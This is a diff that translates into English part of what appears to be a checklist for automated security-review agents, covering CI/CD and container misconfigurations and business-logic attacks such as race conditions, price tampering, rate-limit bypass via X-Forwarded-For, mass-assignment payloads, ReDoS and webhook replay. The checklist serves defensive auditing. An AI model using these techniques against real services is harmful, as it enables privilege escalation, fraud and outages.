+  - **Artifact poisoning**: Tampering with CI/CD intermediate artifacts
+  - **Secret exposure in logs**: Secrets logged unmasked in CI logs
+- **WHY DANGEROUS**: Build pipeline takeover → deploy arbitrary code to production
 - **SEVERITY**:
   - Critical: `pull_request_target` + PR head checkout + secrets access
-  - High: ワークフロー内でのコマンドインジェクション、self-hosted runner に残留データ
-  - Medium: CI ログに secrets が部分的に露出
-  - Low: ワークフローの権限が過剰だが直接的な悪用経路が不明
+  - High: Command injection within workflows, residual data on self-hosted runners
+  - Medium: Secrets partially exposed in CI logs
+  - Low: Excessive workflow permissions but no clear direct exploitation path
 
 #### 5-7. Container and Infrastructure Misconfigurations
 
-- **WHAT**: コンテナ / インフラ設定の不備
+- **WHAT**: Container / infrastructure configuration flaws
 - **WHERE**: `Dockerfile`, `docker-compose.yml`, Kubernetes manifests, Terraform / CloudFormation
 - **HOW TO EXPLOIT**:
-  - `--privileged` フラグ → コンテナエスケープ
-  - `root` ユーザーでの実行 → 権限昇格の足がかり
-  - ホストのファイルシステムマウント (`-v /:/host`) → ホスト全体へのアクセス
-  - 機密情報が Docker イメージのレイヤーに残存（`docker history` で復元）
+  - `--privileged` flag → container escape
+  - Running as `root` user → foothold for privilege escalation
+  - Host filesystem mounts (`-v /:/host`) → full host access
+  - Sensitive information persisting in Docker image layers (recoverable via `docker history`)
   - Kubernetes: `hostPID`, `hostNetwork`, permissive `PodSecurityPolicy`
-  - S3 バケットの公開設定、IAM ポリシーの過剰権限
-- **WHY DANGEROUS**: コンテナエスケープ → ホストシステムの掌握、クラウドリソースの不正利用
+  - Public S3 bucket settings, excessive IAM policy permissions
+- **WHY DANGEROUS**: Container escape → full host system compromise, unauthorized use of cloud resources
 - **SEVERITY**:
-  - Critical: `--privileged` / ホスト全体マウント / root 実行 + ネットワーク公開
-  - High: Docker イメージに secrets 残存、過剰な IAM 権限
-  - Medium: non-root だが不必要な capability が付与
-  - Low: 最小権限ではないが直接的な脱出経路がない
+  - Critical: `--privileged` / full host mount / root execution + network exposure
+  - High: Secrets persisting in Docker images, excessive IAM permissions
+  - Medium: Non-root but unnecessary capabilities granted
+  - Low: Not least-privilege but no direct escape path
 
 ---
 
-## Agent 6: Business Logic Abuser — ビジネスロジック悪用専門 (both)
+## Agent 6: Business Logic Abuser — Business Logic Exploitation Specialist (both)
 
-技術的な脆弱性ではなく、アプリケーションのビジネスロジックの欠陥を悪用する経路を探す。自動スキャナーでは検出困難な攻撃に特化。
+Searches for paths to exploit application business logic flaws, not technical vulnerabilities. Specializes in attacks difficult to detect with automated scanners.
 
 ### Check Items
 
 #### 6-1. Race Conditions / TOCTOU
 
-- **WHAT**: 並行リクエストによる Time-of-Check to Time-of-Use の悪用
-- **WHERE**: 残高チェック → 引き落とし、在庫確認 → 注文確定、クーポン適用、投票/いいね
+- **WHAT**: Time-of-Check to Time-of-Use exploitation via concurrent requests
+- **WHERE**: Balance check → deduction, stock check → order confirmation, coupon application, voting/likes
 - **HOW TO EXPLOIT**:
-  - **Double-spend**: 残高 100 円で 100 円の商品を同時に 2 回購入リクエスト → 両方とも「残高 >= 100」のチェックを通過
-  - **Concurrent coupon usage**: 「1回のみ使用可」のクーポンを並行リクエストで複数回使用
-  - **Like/Vote inflation**: 同一ユーザーの重複チェックが非アトミック → 並行リクエストで複数回投票
-  - **Race in file operations**: ファイル存在チェック → ファイル作成の間に別プロセスがファイルを操作
-- **WHY DANGEROUS**: 金銭的損失、データの不整合、ビジネスルールの完全な無効化
+  - **Double-spend**: With a balance of 100 yen, submit two simultaneous purchase requests for a 100-yen item → both pass the "balance >= 100" check
+  - **Concurrent coupon usage**: Use a "single-use" coupon multiple times via concurrent requests
+  - **Like/Vote inflation**: Duplicate check for the same user is non-atomic → multiple votes via concurrent requests
+  - **Race in file operations**: Another process manipulates the file between the existence check and creation
+- **WHY DANGEROUS**: Financial loss, data inconsistency, complete invalidation of business rules
 - **SEVERITY**:
-  - Critical: 金銭に関わる操作（送金、購入、クーポン）でアトミック性が欠如
-  - High: ポイント / クレジットシステムで race condition が存在
-  - Medium: 投票 / レーティングの操作が可能
-  - Low: 表示カウンターの不整合（ビジネスへの実害が小さい）
+  - Critical: Lack of atomicity in financial operations (transfers, purchases, coupons)
+  - High: Race condition exists in points / credit systems
+  - Medium: Manipulation of votes / ratings is possible
+  - Low: Display counter inconsistency (minimal business impact)
 
 #### 6-2. Payment / Pricing Manipulation
 
-- **WHAT**: 価格・支払いフローの改竄
-- **WHERE**: カート / チェックアウトフロー、割引適用ロジック、通貨変換、サブスクリプション管理
+- **WHAT**: Tampering with price / payment flows
+- **WHERE**: Cart / checkout flows, discount application logic, currency conversion, subscription management
 - **HOW TO EXPLOIT**:
-  - **Negative quantity**: 数量に `-1` を指定 → 返金が発生
-  - **Price override**: クライアントから送信される価格を改竄（hidden field の値を変更）
-  - **Currency rounding**: 通貨変換の丸め誤差を利用した裁定取引
-  - **Coupon stacking**: 併用不可のクーポンを API レベルで強制適用
-  - **Free trial abuse**: 同一メールアドレスの変種 (`+1`, `.` trick) でトライアルを無限再開
-  - **Plan downgrade with feature retention**: ダウングレード後も上位プランの機能がアクティブ
-- **WHY DANGEROUS**: 直接的な金銭的損失
+  - **Negative quantity**: Specify quantity as `-1` → refund is generated
+  - **Price override**: Tamper with client-submitted prices (change hidden field values)
+  - **Currency rounding**: Arbitrage exploiting rounding errors in currency conversion
+  - **Coupon stacking**: Force-apply non-combinable coupons at the API level
+  - **Free trial abuse**: Restart trials indefinitely using email address variants (`+1`, `.` trick)
+  - **Plan downgrade with feature retention**: Higher-tier features remain active after downgrading
+- **WHY DANGEROUS**: Direct financial loss
 - **SEVERITY**:
-  - Critical: 負の数量 / 価格のクライアント側制御で金銭的損失が発生
-  - High: クーポンの無限再利用、通貨丸め誤差の悪用
-  - Medium: フリートライアルの abuse、プラン切り替えの不整合
-  - Low: ポイントシステムの軽微な不整合
+  - Critical: Financial loss occurs through negative quantities / client-side price control
+  - High: Infinite coupon reuse, currency rounding exploitation
+  - Medium: Free trial abuse, plan switching inconsistencies
+  - Low: Minor inconsistencies in points systems
 
 #### 6-3. Rate Limiting Gaps
 
-- **WHAT**: レート制限の欠如または回避可能性
-- **WHERE**: ログイン、パスワードリセット、SMS 送信、API エンドポイント全般
+- **WHAT**: Absence or bypassability of rate limiting
+- **WHERE**: Login, password reset, SMS sending, all API endpoints
 - **HOW TO EXPLOIT**:
-  - レート制限なし → ブルートフォース、credential stuffing
-  - IP ベースのレート制限 → `X-Forwarded-For` ヘッダーで回避
-  - アカウント単位のレート制限 → 複数アカウントで分散
-  - エンドポイント別のレート制限 → 同等の別エンドポイントには制限なし
-  - レート制限のリセットタイミングが予測可能 → スライディングウィンドウではなく固定ウィンドウ
-- **WHY DANGEROUS**: ブルートフォース攻撃、サービス悪用、SMS 爆撃による課金
+  - No rate limiting → brute force, credential stuffing
+  - IP-based rate limiting → bypass via `X-Forwarded-For` header
+  - Account-based rate limiting → distribute across multiple accounts
+  - Per-endpoint rate limiting → equivalent alternative endpoint has no limits
+  - Predictable rate limit reset timing → fixed window instead of sliding window
+- **WHY DANGEROUS**: Brute force attacks, service abuse, SMS bombing charges
 - **SEVERITY**:
-  - Critical: ログインにレート制限なし + 2FA なし
-  - High: パスワードリセット / SMS 送信にレート制限なし
-  - Medium: レート制限あるが `X-Forwarded-For` で回避可能
-  - Low: レート制限はあるが閾値が緩すぎる
+  - Critical: No rate limiting on login + no 2FA
+  - High: No rate limiting on password reset / SMS sending
+  - Medium: Rate limiting exists but bypassable via `X-Forwarded-For`
+  - Low: Rate limiting exists but thresholds are too lenient
 
 #### 6-4. Enumeration Attacks
 
-- **WHAT**: システムから存在情報を推測可能な応答の差異
-- **WHERE**: ログインフォーム、パスワードリセット、ユーザー登録、API レスポンス
+- **WHAT**: Response differences that allow inferring existence information from the system
+- **WHERE**: Login forms, password reset, user registration, API responses
 - **HOW TO EXPLOIT**:
-  - ログイン: 「ユーザーが存在しません」vs「パスワードが間違っています」→ ユーザー名の列挙
-  - 登録: 「このメールアドレスは既に使用されています」→ 登録済みメールの確認
-  - パスワードリセット: 「メールを送信しました」が存在するメールのみ → タイミング差で推測
-  - API: `/api/users/123` が 404 vs 403 → リソースの存在確認
-- **WHY DANGEROUS**: 攻撃対象の特定、クレデンシャルスタッフィングの効率化
+  - Login: "User does not exist" vs. "Incorrect password" → username enumeration
+  - Registration: "This email is already in use" → confirmation of registered emails
+  - Password reset: "Email sent" only for existing emails → timing difference inference
+  - API: `/api/users/123` returns 404 vs. 403 → resource existence confirmation
+- **WHY DANGEROUS**: Target identification, improving credential stuffing efficiency
 - **SEVERITY**:
-  - Critical: ユーザー列挙 + レート制限なし + パスワードスプレー可能
-  - High: メールアドレスの列挙が可能（プライバシー影響）
-  - Medium: タイミング差による推測が理論的に可能
-  - Low: 列挙は可能だが公開情報のみ
+  - Critical: User enumeration + no rate limiting + password spraying possible
+  - High: Email address enumeration possible (privacy impact)
+  - Medium: Timing-based inference theoretically possible
+  - Low: Enumeration possible but only public information
 
 #### 6-5. Mass Assignment / Over-Posting
 
-- **WHAT**: リクエストボディの追加フィールドがモデルに直接反映される脆弱性
-- **WHERE**: ユーザー登録 / 更新 API、ORM のモデルバインディング
+- **WHAT**: Vulnerability where extra fields in request bodies are directly reflected in models
+- **WHERE**: User registration / update APIs, ORM model binding
 - **HOW TO EXPLOIT**:
-  - ユーザー更新: `{"name": "hacker", "role": "admin"}` → `role` が更新される
-  - 登録: `{"email": "...", "password": "...", "isVerified": true}` → メール検証をスキップ
-  - Rails: `params.permit` の漏れ、Django: `fields = '__all__'` の使用
-  - Node.js: `Object.assign(user, req.body)` でリクエストボディ全体をマージ
-- **WHY DANGEROUS**: 権限昇格、検証バイパス、内部フラグの操作
+  - User update: `{"name": "hacker", "role": "admin"}` → `role` gets updated
+  - Registration: `{"email": "...", "password": "...", "isVerified": true}` → skip email verification
+  - Rails: Missing `params.permit`, Django: Using `fields = '__all__'`
+  - Node.js: `Object.assign(user, req.body)` merging entire request body
+- **WHY DANGEROUS**: Privilege escalation, verification bypass, manipulation of internal flags
 - **SEVERITY**:
-  - Critical: `role` / `isAdmin` / `permissions` が mass assignment で変更可能
-  - High: `isVerified` / `isBanned` 等のアカウント状態フラグが変更可能
-  - Medium: 内部フィールド（`createdAt`, `updatedAt`）が上書き可能
-  - Low: 影響の小さいフィールドのみが変更可能
+  - Critical: `role` / `isAdmin` / `permissions` modifiable via mass assignment
+  - High: Account status flags (`isVerified` / `isBanned`, etc.) modifiable
+  - Medium: Internal fields (`createdAt`, `updatedAt`) overwritable
+  - Low: Only low-impact fields modifiable
 
 #### 6-6. Workflow Bypass
 
-- **WHAT**: 意図されたワークフロー（ステップの順序）をスキップする攻撃
-- **WHERE**: 多段階フォーム（ウィザード）、承認フロー、支払いフロー
+- **WHAT**: Attacks that skip the intended workflow (step sequence)
+- **WHERE**: Multi-step forms (wizards), approval flows, payment flows
 - **HOW TO EXPLOIT**:
-  - Step 1 (入力) → Step 2 (確認) → Step 3 (実行) で、Step 3 を直接呼び出す
-  - 管理者承認フローで、承認前の状態から直接「承認済み」API を呼び出す
-  - 支払いフローで、支払い完了コールバックを偽装
-  - メール検証フローをスキップして直接アクティベート
-- **WHY DANGEROUS**: セキュリティチェック / ビジネス検証の完全なバイパス
+  - In a Step 1 (input) → Step 2 (confirmation) → Step 3 (execution) flow, directly call Step 3
+  - In an admin approval flow, directly call the "approved" API from the pre-approval state
+  - Forge payment completion callbacks in payment flows
+  - Skip email verification flow and directly activate
+- **WHY DANGEROUS**: Complete bypass of security checks / business validations
 - **SEVERITY**:
-  - Critical: 支払いフローのバイパス（無料で商品 / サービスを取得）
-  - High: 承認フローのバイパス（未承認コンテンツの公開）
-  - Medium: 確認ステップのスキップ（ただし後続の検証で捕捉可能）
-  - Low: UI ウィザードのステップスキップ（サーバー側で検証済み）
+  - Critical: Payment flow bypass (obtain goods / services for free)
+  - High: Approval flow bypass (publishing unapproved content)
+  - Medium: Skipping confirmation steps (though subsequent validation may catch it)
+  - Low: UI wizard step skipping (validated server-side)
 
 #### 6-7. Resource Consumption / DoS via Business Logic
 
-- **WHAT**: ビジネスロジックの悪用によるリソース枯渇
-- **WHERE**: ファイルアップロード、レポート生成、検索機能、エクスポート機能
+- **WHAT**: Resource exhaustion through business logic exploitation
+- **WHERE**: File uploads, report generation, search functionality, export functionality
 - **HOW TO EXPLOIT**:
-  - **Zip bomb**: 圧縮ファイルアップロードで展開後に巨大サイズ
-  - **ReDoS**: 正規表現の catastrophic backtracking (`(a+)+$` に `aaaa...!`)
-  - **Expensive queries**: 深いネストの GraphQL クエリ、全件取得の REST API
-  - **Infinite pagination**: `?page=1&size=999999` でサーバーメモリを圧迫
-  - **Report generation**: 巨大な日付範囲 / フィルタなしでのレポート生成要求
-  - **Email bombing**: パスワードリセットメールの大量送信（レート制限なし）
-- **WHY DANGEROUS**: サービス停止、インフラコストの高騰、他ユーザーへの影響
+  - **Zip bomb**: Compressed file upload that expands to enormous size
+  - **ReDoS**: Catastrophic backtracking in regular expressions (`(a+)+$` with `aaaa...!`)
+  - **Expensive queries**: Deeply nested GraphQL queries, REST APIs returning all records
+  - **Infinite pagination**: `?page=1&size=999999` exhausting server memory
+  - **Report generation**: Requesting report generation with huge date ranges / no filters
+  - **Email bombing**: Mass password reset email sending (no rate limiting)
+- **WHY DANGEROUS**: Service outage, infrastructure cost spikes, impact on other users
 - **SEVERITY**:
-  - Critical: 単一リクエストでサーバーをクラッシュ可能（zip bomb, ReDoS on critical path）
-  - High: サーバーリソースを長時間占有可能（巨大クエリ、無制限エクスポート）
-  - Medium: 反復リクエストでサービス品質が劣化
-  - Low: コスト増大のみ（サービスは継続可能）
+  - Critical: Single request can crash the server (zip bomb, ReDoS on critical path)
+  - High: Server resources occupied for extended periods (huge queries, unlimited exports)
+  - Medium: Service quality degrades with repeated requests
+  - Low: Cost increase only (service continues operating)
 
 #### 6-8. Replay Attacks
 
-- **WHAT**: 正当なリクエストをキャプチャして再送する攻撃
-- **WHERE**: 支払いリクエスト、認証トークン、OTP / ワンタイムコード
+- **WHAT**: Attack that captures and resends legitimate requests
+- **WHERE**: Payment requests, authentication tokens, OTP / one-time codes
 - **HOW TO EXPLOIT**:
-  - 支払い完了通知（Webhook）をリプレイ → 二重付与
-  - OTP をキャプチャして再利用（有効期間内 / 使用済みチェックなし）
-  - API リクエストに冪等性キーがない → 同一リクエストの再送で重複処理
-  - nonce なし → 署名付きリクエストのリプレイ
-- **WHY DANGEROUS**: 金銭的損失、認証バイパス、データの重複
+  - Replay payment completion notifications (webhooks) → double credit
+  - Capture and reuse OTPs (within validity period / no used-check)
+  - API requests without idempotency keys → duplicate processing from resending the same request
+  - No nonce → replay of signed requests
+- **WHY DANGEROUS**: Financial loss, authentication bypass, data duplication
 - **SEVERITY**:
-  - Critical: 支払い Webhook のリプレイで金銭的損失が発生
-  - High: OTP / ワンタイムトークンが再利用可能
-  - Medium: API に冪等性保証がなく重複処理が発生
-  - Low: リプレイは可能だが影響が読み取り操作のみ
+  - Critical: Financial loss from replaying payment webhooks
+  - High: OTP / one-time tokens reusable
+  - Medium: API lacks idempotency guarantees, causing duplicate processing
+  - Low: Replay possible but impact limited to read operations
